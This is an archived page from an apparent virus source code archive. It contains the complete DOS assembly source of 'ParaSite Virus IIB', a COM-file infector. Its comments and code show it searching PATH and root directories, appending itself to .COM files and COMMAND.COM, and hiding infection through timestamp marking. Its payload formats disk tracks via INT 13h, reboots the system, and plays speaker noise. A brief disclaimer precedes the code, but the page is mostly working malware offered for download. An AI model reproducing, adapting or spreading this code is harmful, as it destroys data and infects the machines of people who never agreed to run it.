<a href="vw13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13_507_asm.php">vw13_507_asm</a><br>
<a href="vw13534a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534a_asm.php">vw13534a_asm</a><br>
<a href="vw13534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534_asm.php">vw13534_asm</a><br>
<a href="vw13534b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534b_asm.php">vw13534b_asm</a><br>
<a href="vx_163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx_163_asm.php">vx_163_asm</a><br>
<a href="vx-163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx-163_asm.php">vx-163_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;********************************************************************    
;   <PARSIT2B.ASM>   -   ParaSite Virus IIB                              
;                        By: Rock Steady                                 
;  Close to one year I created this Virus. As you can see it is quite    
;  old... Maybe too Old... But here it is... It Sucks... but its great   
;  for any virus beginner... Anyhow...                                   
;  NOTES: Simple COM infector. 10% of the time it reboots the system     
;         20% it plays machine gun noices on the PC speaker... and       
;         70% of the time is infects another COM file... Have fun...     
;********************************************************************    
MOV_CX  MACRO X                                                          
        DB    0B9H                                                       
        DW    X                                                          
ENDM                                                                     
                                                                         
CODE    SEGMENT                                                          
        ASSUME DS:CODE,SS:CODE,CS:CODE,ES:CODE                           
        ORG     100H                                                     
                                                                         
                                                                         
VCODE:  JMP     virus                                                    
                                                                         
        NOP                                                              
        NOP                             ; To identify it as an Infected  
        NOP                             ; Program!                       
                                                                         
v_start equ     $                                                        
                                                                         
                                                                         
virus:  PUSH    CX                                                       
        MOV     DX,OFFSET vir_dat                                        
        CLD                                                              
        MOV     SI,DX                                                    
        ADD     SI,first_3                                               
        JMP     Rock_1                                                   
Rock_2:                                                                  
        MOV     DX,dta                                                   
        ADD     DX,SI                                                    
        MOV     AH,1AH                                                   
        INT     21H                                                      
        PUSH    ES                                                       
        PUSH    SI                                                       
        MOV     ES,DS:2CH                                                
        MOV     DI,0                                                     
        JMP     Day_Of_Week                                              
Rock_1:                                                                  
        MOV     CX,3                                                     
        MOV     DI,OFFSET 100H                                           
        REPZ    MOVSB                                                    
        MOV     SI,DX                                                    
        PUSH    ES                                                       
        MOV     AH,2FH                                                   
        INT     21H                                                      
        MOV     [SI+old_dta],BX                                          
        MOV     [SI+old_dts],ES                                          
        POP     ES                                                       
        JMP     Rock_2                                                   
                                                                         
Day_Of_Week:                                                             
        MOV     AH,2AH                  ;Get System date!                
        INT     21H                                                      
        CMP     AL,1                    ;Check to See if it's Monday!    
        JGE     day_check               ;Jump if later than Mondays      
        JMP     Get_Time                                                 
day_check:                                                               
        CMP     AL,1                    ;Check to see if it is the 1st   
        JA      Get_Time                ;If yes, create a MESS...        
        JMP     Bad_Mondays             ;If not, then go on with infecti 
mess:                                                                    
                                                                         
Bad_Mondays:                                                             
          MOV   DL,2                    ;The Formatting Tracks..         
          MOV   AH,05                                                    
          MOV   DH,80h                                                   
          MOV   CH,0                                                     
          INT   13h                                                      
                                                                         
Play_music:                                                              
          MOV   CX,20d                  ;Set number of Shots             
new_shot:                                                                
          PUSH  CX                      ;Save Count                      
          CALL  Shoot                                                    
          MOV   CX,4000H                                                 
Silent:   LOOP  silent                                                   
          POP   CX                                                       
          LOOP  new_Shot                                                 
          JMP   mess                                                     
                                                                         
SHOOT     proc  near                    ;The Machine Gun Noices...       
          MOV   DX,140h                                                  
          MOV   BX,20h                                                   
          IN    AL,61h                                                   
          AND   AL,11111100b                                             
SOUND:    XOR   AL,2                                                     
          OUT   61h,al                                                   
          ADD   dx,9248h                                                 
          MOV   CL,3                                                     
          ROR   DX,CL                                                    
          MOV   CX,DX                                                    
          AND   cx,1ffh                                                  
          OR    CX,10                                                    
WAITA:    LOOP  WAITA                                                    
          DEC   BX                                                       
          JNZ   SOUND                                                    
          AND   AL,11111100b                                             
          OUT   61h,AL                                                   
          RET                                                            
Shoot     Endp                                                           
                                                                         
Get_Time:                                                                
          MOV   AH,2Ch                  ; Get System Time!               
          INT   21h                     ;                                
          AND   DH,0fh                                                   
          CMP   DH,3                                                     
          JB    Play_music                                               
          CMP   DH,3h                                                    
          JA    Find_Path                                                
          INT   19h                                                      
                                                                         
go:                                                                      
        MOV     AH, 47H                                                  
        XOR     DL,DL                                                    
        ADD     SI, OFFSET orig_path - OFFSET buffer - 8                 
        INT     21H                                                      
        JC      find_path                                                
                                                                         
        MOV     AH,3BH                                                   
        MOV     DX,SI                                                    
        ADD     DX, OFFSET root_dir - OFFSET orig_path                   
        INT     21H                                                      
                                                                         
infect_root:                                                             
        MOV     [BX+nam_ptr],DI                                          
        MOV     SI,BX                                                    
        ADD     SI,f_ipec                                                
        MOV     CX,6                                                     
        REPZ    MOVSB                                                    
        JMP     hello                                                    
                                                                         
find_path:                                                               
        POP     SI                      ; Seek and Destroy...            
        PUSH    SI                                                       
        ADD     SI,env_str                                               
        LODSB                                                            
        MOV     CX,OFFSET 8000H                                          
        REPNZ   SCASB                                                    
        MOV     CX,4                                                     
                                                                         
check_next_4:                                                            
        LODSB                                                            
        SCASB                                                            
;                                                                        
; The JNZ line specifies that if there is no PATH present, then we will  
; along and infect the ROOT directory on the default drive.              
                                                                         
        JNZ     find_path               ;If not path, then go to ROOT di 
        LOOP    check_next_4            ;Go back and check for more char 
        POP     SI                      ;Load in PATH again to look for  
        POP     ES                                                       
        MOV     [SI+path_ad],DI                                          
        MOV     DI,SI                                                    
        ADD     DI,wrk_spc                                               
        MOV     BX,SI                                                    
        ADD     SI,wrk_spc              ;the File Handle                 
        MOV     DI,SI                                                    
        JMP     SHORT   slash_ok                                         
                                                                         
set_subdir:                                                              
        CMP     WORD PTR [SI+path_ad],0                                  
        JNZ     found_subdir                                             
        JMP     all_done                                                 
                                                                         
                                                                         
found_subdir:                                                            
        PUSH    DS                                                       
        PUSH    SI                                                       
        MOV     DS,ES:2CH                                                
        MOV     DI,SI                                                    
        MOV     SI,ES:[DI+path_ad]                                       
        ADD     DI,wrk_spc              ;DI is the handle to infect!     
                                                                         
                                                                         
move_subdir:                                                             
        LODSB                           ;To tedious work to move into su 
        NOP                                                              
        CMP     AL,';'                  ;Does it end with a ; character? 
        JZ      moved_one               ;if yes, then we found a subdir  
        CMP     AL,0                    ;is it the end of the path?      
        JZ      moved_last_one          ;if yes, then we save the PATH   
        STOSB                           ;marker into DI for future refer 
        JMP     SHORT   move_subdir                                      
                                                                         
moved_last_one:                                                          
        MOV     SI,0                                                     
                                                                         
moved_one:                                                               
        POP     BX                      ;BX is where the virus data is   
        POP     DS                      ;Restore DS                      
        NOP                                                              
        MOV     [BX+path_ad],SI         ;Where is the next subdir?       
        CMP     CH,'\'                  ;Check to see if it ends in \    
        JZ      slash_ok                ;If yes, then it's OK            
        MOV     AL,'\'                  ;if not, then add one...         
        STOSB                           ;store the sucker                
                                                                         
                                                                         
                                                                         
slash_ok:                                                                
        MOV     [BX+nam_ptr],DI         ;Move the filename into workspac 
        MOV     SI,BX                   ;Restore the original SI value   
        ADD     SI,f_spec               ;Point to COM file victim        
        MOV     CX,6                                                     
        REPZ    MOVSB                   ;Move victim into workspace      
hello:                                                                   
        MOV     SI,BX                                                    
        MOV     AH,4EH                                                   
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                   ;DX is ... The File to infect    
        MOV     CX,3                    ;Attributes of Read Only or Hidd 
        INT     21H                                                      
        JMP     SHORT   find_first                                       
joe1:                                                                    
        JMP     go                                                       
                                                                         
find_next:                                                               
        MOV     AH,4FH                                                   
        INT     21H                                                      
                                                                         
find_first:                                                              
        JNB     found_file              ;Jump if we found it             
        JMP     SHORT   set_subdir      ;Otherwise, get another subdirec 
                                                                         
found_file:                                                              
        MOV     AX,[SI+dta_tim]         ;Get time from DTA               
        AND     AL,1EH                  ;Mask to remove all but seconds  
        CMP     AL,1EH                  ;60 seconds                      
        JZ      find_next                                                
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too LON 
        JA      find_next               ;If too long, find another one   
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?              
        JB      find_next               ;Then go find another one        
        MOV     DI,[SI+nam_ptr]                                          
        PUSH    SI                                                       
        ADD     SI,dta_nam                                               
                                                                         
more_chars:                                                              
        LODSB                                                            
        STOSB                                                            
        CMP     AL,0                                                     
        JNZ     more_chars                                               
        POP     SI                                                       
        MOV     AX,OFFSET 4300H                                          
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                                                    
        INT     21H                                                      
        MOV     [SI+old_att],CX                                          
        MOV     AX,OFFSET 4301H                                          
        AND     CX,OFFSET 0FFFEH                                         
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                                                    
        INT     21H                                                      
        MOV     AX,OFFSET 3D02H                                          
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                                                    
        INT     21H                                                      
        JNB     opened_ok                                                
        JMP     fix_attr                                                 
                                                                         
opened_ok:                                                               
        MOV     BX,AX                                                    
        MOV     AX,OFFSET 5700H                                          
        INT     21H                                                      
        MOV     [SI+old_tim],CX         ;Save file time                  
        MOV     [SI+ol_date],DX         ;Save the date                   
        MOV     AH,2CH                                                   
        INT     21H                                                      
        AND     DH,7                                                     
        JMP     infect                                                   
                                                                         
                                                                         
infect:                                                                  
        MOV     AH,3FH                                                   
        MOV     CX,3                                                     
        MOV     DX,first_3                                               
        ADD     DX,SI                                                    
        INT     21H             ;Save first 3 bytes into the data area   
        JB      fix_time_stamp                                           
        CMP     AX,3                                                     
        JNZ     fix_time_stamp                                           
        MOV     AX,OFFSET 4202H                                          
        MOV     CX,0                                                     
        MOV     DX,0                                                     
        INT     21H                                                      
        JB      fix_time_stamp                                           
        MOV     CX,AX                                                    
        SUB     AX,3                                                     
        MOV     [SI+jmp_dsp],AX                                          
        ADD     CX,OFFSET c_len_y                                        
        MOV     DI,SI                                                    
        SUB     DI,OFFSET c_len_x                                        
        JMP     CONT                                                     
JOE2:                                                                    
        JMP     JOE1                                                     
CONT:                                                                    
        MOV     [DI],CX                                                  
        MOV     AH,40H                                                   
        MOV_CX  virlen                                                   
        MOV     DX,SI                                                    
        SUB     DX,OFFSET codelen                                        
        INT     21H                                                      
        JB      fix_time_stamp                                           
        CMP     AX,OFFSET virlen                                         
        JNZ     fix_time_stamp                                           
        MOV     AX,OFFSET 4200H                                          
        MOV     CX,0                                                     
        MOV     DX,0                                                     
        INT     21H                                                      
        JB      fix_time_stamp                                           
        MOV     AH,40H                                                   
        MOV     CX,3                                                     
        MOV     DX,SI                                                    
        ADD     DX,jmp_op                                                
        INT     21H                                                      
                                                                         
fix_time_stamp:                                                          
        MOV     DX,[SI+ol_date]                                          
        MOV     CX,[SI+old_tim]                                          
        AND     CX,OFFSET 0FFE0H                                         
        OR      CX,1EH                                                   
        MOV     AX,OFFSET 5701H                                          
        INT     21H                                                      
        MOV     AH,3EH                                                   
        INT     21H                                                      
                                                                         
fix_attr:                                                                
        MOV     AX,OFFSET 4301H                                          
        MOV     CX,[SI+old_att]                                          
        MOV     DX,wrk_spc                                               
        ADD     DX,SI                                                    
        INT     21H                                                      
                                                                         
all_done:                                                                
        PUSH    DS                                                       
        MOV     AH,1AH                                                   
        MOV     DX,[SI+old_dta]                                          
        MOV     DS,[SI+old_dts]                                          
        INT     21H                                                      
        POP     DS                                                       
                                                                         
quit:                                                                    
        MOV     BX,OFFSET count                                          
        CMP     BX,0                                                     
        JB      joe2                                                     
        POP     CX                                                       
        XOR     AX,AX                   ;XOR values so that we will give 
        XOR     BX,BX                   ;poor sucker a hard time trying  
        XOR     DX,DX                   ;reassemble the source code if h 
        XOR     SI,SI                   ;decides to dissassemble us.     
        MOV     DI,OFFSET 0100H                                          
        PUSH    DI                                                       
        XOR     DI,DI                                                    
        RET     0FFFFH                  ;Return back to the beginning    
                                        ;of the program                  
                                                                         
vir_dat EQU     $                                                        
                                                                         
Aurther DB      "ParaSite IIB - By: Rock Steady"                         
olddta_ DW      0                                                        
olddts_ DW      0                                                        
oldtim_ DW      0                                                        
count_  DW      0                                                        
oldate_ DW      0                                                        
oldatt_ DW      0                                                        
first3_ EQU     $                                                        
        INT     20H                                                      
        NOP                                                              
jmpop_  DB      0E9H                                                     
jmpdsp_ DW      0                                                        
fspec_  DB      '*.COM',0                                                
fipec_  DB      'COMMAND.COM',0                                          
pathad_ DW      0                                                        
namptr_ DW      0                                                        
envstr_ DB      'PATH='                                                  
wrkspc_ DB      40h dup (0)                                              
dta_    DB      16h dup (0)                                              
dtatim_ DW      0,0                                                      
dtalen_ DW      0,0                                                      
dtanam_ DB      0Dh dup (0)                                              
buffer  DB      0CDh, 20h, 0, 0, 0, 0, 0, 0                              
orig_path DB    64 dup (?)                                               
root_dir DB     '\',0                                                    
lst_byt EQU     $                                                        
virlen  =       lst_byt - v_start                                        
codelen =       vir_dat - v_start                                        
c_len_x =       vir_dat - v_start - 2                                    
c_len_y =       vir_dat - v_start + 100H                                 
old_dta =       olddta_ - vir_dat                                        
old_dts =       olddts_ - vir_dat                                        
old_tim =       oldtim_ - vir_dat                                        
ol_date =       oldate_ - vir_dat                                        
old_att =       oldatt_ - vir_dat                                        
first_3 =       first3_ - vir_dat                                        
jmp_op  =       jmpop_  - vir_dat                                        
jmp_dsp =       jmpdsp_ - vir_dat                                        
f_spec  =       fspec_  - vir_dat                                        
f_ipec  =       fipec_  - vir_dat                                        
path_ad =       pathad_ - vir_dat                                        
nam_ptr =       namptr_ - vir_dat                                        
env_str =       envstr_ - vir_dat                                        
wrk_spc =       wrkspc_ - vir_dat                                        
dta     =       dta_    - vir_dat                                        
dta_tim =       dtatim_ - vir_dat                                        
dta_len =       dtalen_ - vir_dat                                        
dta_nam =       dtanam_ - vir_dat                                        
count   =       count_  - vir_dat                                        
         CODE    ENDS                                                    
END     VCODE                                                            


</textarea></td></tr></table></body></html>
